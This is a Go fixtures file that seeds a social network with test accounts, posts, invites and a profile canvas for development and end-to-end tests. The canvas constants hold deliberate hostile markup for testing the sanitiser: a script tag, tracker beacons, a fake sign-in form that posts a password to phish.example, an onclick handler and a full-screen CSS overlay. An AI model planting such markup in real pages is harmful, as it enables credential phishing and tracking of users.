// Package fixtures builds a known, populated Amici for local development and
// for the end-to-end suite.
//
// There is one definition of the fixture world and both callers use it: the
// amici-seed command for someone working on their laptop, and the
// POST /fixtures/reset endpoint that the browser tests call between specs.
// Keeping them in one place means a test cannot pass against a world that a
// developer never sees, which is the usual way fixtures rot.
//
// The world is small and deliberately shaped around the rules worth exercising:
// a friendship, a pending request from each direction, a block, a young
// member who cannot be reached by email, an account that has opted out of
// email requests, a private post that must never appear in anybody else's
// feed, and a profile canvas containing markup that has to be sanitised.
package fixtures

import (
	"context"
	"fmt"
	"time"

	"github.com/kurtisrogers/amici/internal/brand"
	"github.com/kurtisrogers/amici/internal/domain"
	"github.com/kurtisrogers/amici/internal/security"
	canvassan "github.com/kurtisrogers/amici/internal/security/canvas"
)

// Password is the password every fixture account uses. It is long enough to
// satisfy the real policy, because fixtures that bypass validation are
// fixtures that hide validation bugs.
const Password = "friends-and-family"

// Person is a fixture account, described in the terms a person would use.
type Person struct {
	Handle      string
	DisplayName string
	Email       string
	Role        domain.Role
	Colourway   string
	Bio         string
	// AgeYears sets the birth date relative to now, which is how the young
	// member stays young however long this code lives.
	AgeYears int
	// ReachableByEmail is applied after registration, since registration
	// derives it from age.
	ReachableByEmail bool
	// Note explains what this account is for, printed by the seed command.
	Note string
}

// People is the fixture cast.
//
// The names are Italian and Spanish because Amici is, and because a fixture
// set full of Alice and Bob tells you nothing about how a page looks with real
// names in it.
var People = []Person{
	{
		Handle: "rosa", DisplayName: "Rosa Marchetti", Email: "rosa@example.test",
		Role: domain.RoleMember, Colourway: "limonata", AgeYears: 34,
		Bio:              "Tomatoes, terrible puns, three nieces.",
		ReachableByEmail: true,
		Note:             "The main member. Friends with Teo and Nina. Has a profile canvas.",
	},
	{
		Handle: "teo", DisplayName: "Teo Marchetti", Email: "teo@example.test",
		Role: domain.RoleMember, Colourway: "cielo", AgeYears: 38,
		Bio:              "Rosa's brother. Cycles slowly, on purpose.",
		ReachableByEmail: true,
		Note:             "Rosa's friend. Use this account to check a friend can see Rosa's posts.",
	},
	{
		Handle: "nina", DisplayName: "Nina Alonso", Email: "nina@example.test",
		Role: domain.RoleMember, Colourway: "fico", AgeYears: 29,
		Bio:              "Choir on Tuesdays. Bring biscuits.",
		ReachableByEmail: true,
		Note:             "Rosa's friend, and has a request waiting from Bruno.",
	},
	{
		Handle: "bruno", DisplayName: "Bruno Sala", Email: "bruno@example.test",
		Role: domain.RoleMember, Colourway: "pomodoro", AgeYears: 45,
		Bio:              "Fixes things. Mostly bicycles.",
		ReachableByEmail: true,
		Note:             "A stranger to Rosa. Use this account to check that a non-friend sees nothing.",
	},
	{
		Handle: "sofia", DisplayName: "Sofia Marchetti", Email: "sofia@example.test",
		Role: domain.RoleMember, Colourway: "menta", AgeYears: 15,
		Bio:              "Rosa's niece.",
		ReachableByEmail: false,
		Note:             "A young member. Cannot be reached by email address at all, and her invite codes expire in four hours rather than twenty four.",
	},
	{
		Handle: "quiet", DisplayName: "Marco Quieto", Email: "marco@example.test",
		Role: domain.RoleMember, Colourway: "notte", AgeYears: 52,
		Bio:              "Reachable by code only, thank you.",
		ReachableByEmail: false,
		Note:             "An adult who has switched off email requests. A request to marco@example.test must silently go nowhere.",
	},
	{
		Handle: "help-desk", DisplayName: "Ines from Support", Email: "support@example.test",
		Role: domain.RoleSupport, Colourway: "cielo", AgeYears: 41,
		Bio:              "Here to help with accounts.",
		ReachableByEmail: true,
		Note:             "A support account. Can look accounts up and suspend them, and cannot read a single post.",
	},
	{
		Handle: "dev", DisplayName: "Kit the Developer", Email: "dev@example.test",
		Role: domain.RoleDeveloper, Colourway: "notte", AgeYears: 33,
		Bio:              "Keeps the lights on.",
		ReachableByEmail: true,
		Note:             "A developer account. Sees diagnostics and the audit trail, and no member content.",
	},
}

// rosaCanvas is the fixture profile page.
//
// It is written to be half legitimate nostalgia and half attack, so that
// loading the seeded profile exercises the sanitiser rather than just the
// happy path. Everything from the script tag onwards must be gone by the time
// this reaches a browser, and the marquee must survive.
const rosaCanvas = `<div class="shrine">
  <center>
    <marquee direction="left" scrollamount="5">
      <font color="#c2185b" face="Comic Sans MS" size="5">welcome to rosa's corner of the internet</font>
    </marquee>
  </center>

  <table border="0" cellpadding="8" class="top-panel">
    <tr>
      <td valign="top">
        <h2>my top four</h2>
        <ol>
          <li>my nan</li>
          <li>tomatoes</li>
          <li>Teo, when he brings the good bread</li>
          <li>Tuesday choir</li>
        </ol>
      </td>
      <td valign="top">
        <img src="/static/stickers/lemon.svg" alt="a lemon" width="64" height="64">
        <img src="/static/stickers/heart.svg" alt="a heart" width="64" height="64">
        <img src="/static/stickers/cat.svg" alt="a cat" width="64" height="64">
      </td>
    </tr>
  </table>

  <details open>
    <summary>the greenhouse situation</summary>
    <p>Four varieties this year. The San Marzanos are being dramatic.</p>
  </details>

  <p class="signoff">thanks for visiting <span class="glow">&hearts;</span></p>

  <script>alert('this should never run')</script>
  <iframe src="https://tracker.example/beacon"></iframe>
  <img src="https://tracker.example/pixel.gif" alt="">
  <form action="https://phish.example/steal"><input type="password" name="p"><button>Sign in to Amici</button></form>
  <div onclick="alert('nor this')">a div with a handler</div>
</div>`

// rosaCanvasCSS pairs legitimate decoration with things the CSS allowlist has
// to strip: an @import, an external background, and a fixed-position overlay.
const rosaCanvasCSS = `@import url("https://fonts.example/comic.css");

body {
  background: linear-gradient(160deg, #fff6d5 0%, #ffe1ef 55%, #e8f4ff 100%);
  color: #4a2545;
  font-family: Verdana, Geneva, sans-serif;
  padding: 1.5rem;
}

.shrine { max-width: 40rem; margin: 0 auto; }

h2 {
  font-size: 1.4rem;
  text-shadow: 2px 2px 0 #ffd166;
  letter-spacing: 0.04em;
}

.top-panel {
  background: #fffdf5;
  border: 3px dashed #f2b705;
  border-radius: 14px;
}

.glow { animation: pulse 1.4s ease-in-out infinite; display: inline-block; }

@keyframes pulse {
  from { transform: scale(1); opacity: 0.7; }
  to   { transform: scale(1.35); opacity: 1; }
}

.signoff { text-align: center; font-size: 1.1rem; }

.tracker { background-image: url(https://tracker.example/bg.png); }
.overlay { position: fixed; inset: 0; z-index: 99999; }
`

// Seeded is what the loader produced, so the seed command can print something
// useful and the tests can assert against known ids.
type Seeded struct {
	Accounts map[string]*domain.Account
	// InviteCodes maps a handle to a live request identifier for that member,
	// so a browser test can redeem one without minting it through the UI.
	InviteCodes map[string]string
	Posts       int
}

// Load wipes the database and rebuilds the fixture world.
//
// It is destructive by design and refuses to run against a store that is not
// obviously disposable, which the caller asserts by passing allowDestructive.
func Load(ctx context.Context, store domain.Store, clock domain.Clock, secret []byte, allowDestructive bool) (*Seeded, error) {
	if !allowDestructive {
		return nil, fmt.Errorf("fixtures: refusing to load without an explicit destructive flag")
	}
	resettable, ok := store.(domain.Resettable)
	if !ok {
		return nil, fmt.Errorf("fixtures: this store cannot be reset")
	}
	if err := resettable.TruncateAll(ctx); err != nil {
		return nil, fmt.Errorf("fixtures: reset store: %w", err)
	}

	now := clock.Now()
	out := &Seeded{
		Accounts:    map[string]*domain.Account{},
		InviteCodes: map[string]string{},
	}

	hash, err := security.HashPassword(Password)
	if err != nil {
		return nil, fmt.Errorf("fixtures: hash password: %w", err)
	}

	for _, p := range People {
		colourway := p.Colourway
		if _, err := brand.ValidateColourway(colourway); err != nil {
			return nil, fmt.Errorf("fixtures: %s has an unknown colourway %q", p.Handle, colourway)
		}
		birth := birthDateFor(now, p.AgeYears)
		acct := &domain.Account{
			ID:               domain.NewID(),
			Handle:           p.Handle,
			DisplayName:      p.DisplayName,
			Email:            p.Email,
			EmailNorm:        domain.NormaliseEmail(p.Email),
			PasswordHash:     hash,
			Role:             p.Role,
			Status:           domain.StatusActive,
			BirthDate:        birth,
			Colourway:        colourway,
			Bio:              p.Bio,
			ReachableByEmail: p.ReachableByEmail && p.AgeYears >= domain.AdultAgeYears,
			CreatedAt:        now.Add(-time.Duration(p.AgeYears) * time.Hour),
			UpdatedAt:        now,
		}
		if err := store.CreateAccount(ctx, acct); err != nil {
			return nil, fmt.Errorf("fixtures: create %s: %w", p.Handle, err)
		}
		out.Accounts[p.Handle] = acct
	}

	rosa := out.Accounts["rosa"]
	teo := out.Accounts["teo"]
	nina := out.Accounts["nina"]
	bruno := out.Accounts["bruno"]
	sofia := out.Accounts["sofia"]

	// Rosa is friends with Teo, Nina and her niece Sofia. Bruno is a stranger
	// to her, which is what makes him useful in a test.
	for _, friend := range []*domain.Account{teo, nina, sofia} {
		if err := store.CreateFriendship(ctx, rosa.ID, friend.ID, now.Add(-48*time.Hour)); err != nil {
			return nil, fmt.Errorf("fixtures: friendship rosa-%s: %w", friend.Handle, err)
		}
	}

	// A request waiting for Nina, so the accept path has something to act on.
	if err := store.CreateFriendRequest(ctx, &domain.FriendRequest{
		ID: domain.NewID(), FromID: bruno.ID, ToID: nina.ID,
		State: domain.RequestPending, Origin: domain.OriginEmail,
		Note:      "We met at the bike shop, I'm Bruno.",
		CreatedAt: now.Add(-3 * time.Hour),
	}); err != nil {
		return nil, fmt.Errorf("fixtures: bruno to nina request: %w", err)
	}

	// A request Rosa has sent, so the withdraw path has something to act on.
	if err := store.CreateFriendRequest(ctx, &domain.FriendRequest{
		ID: domain.NewID(), FromID: rosa.ID, ToID: bruno.ID,
		State: domain.RequestPending, Origin: domain.OriginEmail,
		Note:      "Teo says you fixed his wheel.",
		CreatedAt: now.Add(-2 * time.Hour),
	}); err != nil {
		return nil, fmt.Errorf("fixtures: rosa to bruno request: %w", err)
	}

	// Teo has blocked the account that has opted out of email requests, so
	// there is a block in the world to look at.
	if err := store.CreateBlock(ctx, &domain.Block{
		BlockerID: teo.ID, BlockedID: out.Accounts["quiet"].ID, CreatedAt: now.Add(-time.Hour),
	}); err != nil {
		return nil, fmt.Errorf("fixtures: teo block: %w", err)
	}

	posts := []struct {
		author     *domain.Account
		body       string
		visibility domain.Visibility
		ago        time.Duration
	}{
		{rosa, "The greenhouse is officially open for the season. Four kinds of tomato this year and I am fully prepared to be smug about it in September.", domain.VisibilityFriends, 30 * time.Minute},
		{teo, "Cycled to the coast and back. Took the long way. Regret nothing, apart from the last eleven miles.", domain.VisibilityFriends, 2 * time.Hour},
		{nina, "Choir was lovely tonight. We finally got through the tricky bit in the second verse without anyone laughing.", domain.VisibilityFriends, 5 * time.Hour},
		{rosa, "Note to self: two hundred basil seeds was ambitious.", domain.VisibilityFriends, 26 * time.Hour},
		{sofia, "Aunty Rosa let me name a tomato plant. Its name is Gerald.", domain.VisibilityFriends, 8 * time.Hour},
		{teo, "Does anyone still have my good bread tin", domain.VisibilityFriends, 50 * time.Hour},
		// Rosa's private note. This one must never appear in anybody else's
		// feed, and the browser tests check exactly that.
		{rosa, "Private note to myself: ring the dentist, and stop putting it off.", domain.VisibilityOnlyMe, time.Hour},
		// Bruno is a stranger to Rosa, so this must never reach her feed.
		{bruno, "Rebuilt a 1974 frame this weekend. Beautiful thing.", domain.VisibilityFriends, 4 * time.Hour},
	}

	for i, p := range posts {
		post := &domain.Post{
			ID:         domain.NewID(),
			AuthorID:   p.author.ID,
			Body:       p.body,
			Visibility: p.visibility,
			CreatedAt:  now.Add(-p.ago),
		}
		if err := store.CreatePost(ctx, post); err != nil {
			return nil, fmt.Errorf("fixtures: create post %d: %w", i, err)
		}
		out.Posts++

		// Reactions and a comment on the first post, so the feed is not a
		// wall of untouched text.
		if i == 0 {
			for _, r := range []struct {
				who  *domain.Account
				kind domain.ReactionKind
			}{
				{teo, domain.ReactionLove},
				{nina, domain.ReactionCelebrate},
				{sofia, domain.ReactionLaugh},
			} {
				if err := store.SetReaction(ctx, &domain.Reaction{
					PostID: post.ID, AccountID: r.who.ID, Kind: r.kind,
					CreatedAt: now.Add(-20 * time.Minute),
				}); err != nil {
					return nil, fmt.Errorf("fixtures: reaction: %w", err)
				}
			}
			for _, c := range []struct {
				who  *domain.Account
				body string
			}{
				{teo, "Save me the San Marzanos and I will bring the good bread."},
				{nina, "Smug is allowed. You earned it last year."},
			} {
				if err := store.CreateComment(ctx, &domain.Comment{
					ID: domain.NewID(), PostID: post.ID, AuthorID: c.who.ID,
					Body: c.body, CreatedAt: now.Add(-15 * time.Minute),
				}); err != nil {
					return nil, fmt.Errorf("fixtures: comment: %w", err)
				}
			}
		}
	}

	// Rosa's profile canvas, stored the same way a save through the editor
	// stores it: source kept verbatim, rendering produced by the sanitiser.
	res := canvassan.Sanitise(rosaCanvas, rosaCanvasCSS)
	if err := store.SaveCanvas(ctx, &domain.Canvas{
		AccountID:        rosa.ID,
		HTMLSource:       rosaCanvas,
		CSSSource:        rosaCanvasCSS,
		HTMLRendered:     res.HTML,
		CSSRendered:      res.CSS,
		SanitiserVersion: canvassan.Version,
		UpdatedAt:        now,
	}); err != nil {
		return nil, fmt.Errorf("fixtures: save canvas: %w", err)
	}

	// A live invite code for Rosa and one for the young member, so tests can
	// exercise redemption and the shorter young-member lifetime without
	// clicking through the UI first.
	for _, owner := range []*domain.Account{rosa, sofia} {
		code, err := security.NewInviteCode()
		if err != nil {
			return nil, fmt.Errorf("fixtures: mint invite: %w", err)
		}
		if err := store.CreateInvite(ctx, &domain.Invite{
			ID: domain.NewID(), OwnerID: owner.ID,
			CodeHash:  security.HashInviteCode(secret, code),
			Label:     "for testing",
			CreatedAt: now,
			ExpiresAt: now.Add(owner.InviteTTLFor(now)),
		}); err != nil {
			return nil, fmt.Errorf("fixtures: create invite for %s: %w", owner.Handle, err)
		}
		out.InviteCodes[owner.Handle] = code
	}

	// An expired code, so the "that has expired" path has something real
	// behind it rather than needing a clock trick.
	expiredCode, err := security.NewInviteCode()
	if err != nil {
		return nil, fmt.Errorf("fixtures: mint expired invite: %w", err)
	}
	expiredAt := now.Add(-25 * time.Hour)
	if err := store.CreateInvite(ctx, &domain.Invite{
		ID: domain.NewID(), OwnerID: nina.ID,
		CodeHash:  security.HashInviteCode(secret, expiredCode),
		Label:     "expired on purpose",
		CreatedAt: expiredAt,
		ExpiresAt: expiredAt.Add(domain.InviteTTL),
	}); err != nil {
		return nil, fmt.Errorf("fixtures: create expired invite: %w", err)
	}
	out.InviteCodes["expired"] = expiredCode

	// An open report, so the support queue is not empty on a fresh database.
	if err := store.CreateReport(ctx, &domain.Report{
		ID: domain.NewID(), ReporterID: nina.ID,
		SubjectKind: "account", SubjectID: bruno.ID,
		Reason:    "I do not know this person and they have asked to be friends twice.",
		State:     domain.ReportOpen,
		CreatedAt: now.Add(-90 * time.Minute),
	}); err != nil {
		return nil, fmt.Errorf("fixtures: create report: %w", err)
	}

	return out, nil
}

// birthDateFor returns a birth date that makes somebody the given age today.
func birthDateFor(now time.Time, ageYears int) domain.Date {
	// Six months back as well as the years, so nobody's birthday is today and
	// an off-by-one in age arithmetic cannot pass by luck.
	t := now.AddDate(-ageYears, -6, 0)
	return domain.Date{Year: t.Year(), Month: int(t.Month()), Day: t.Day()}
}
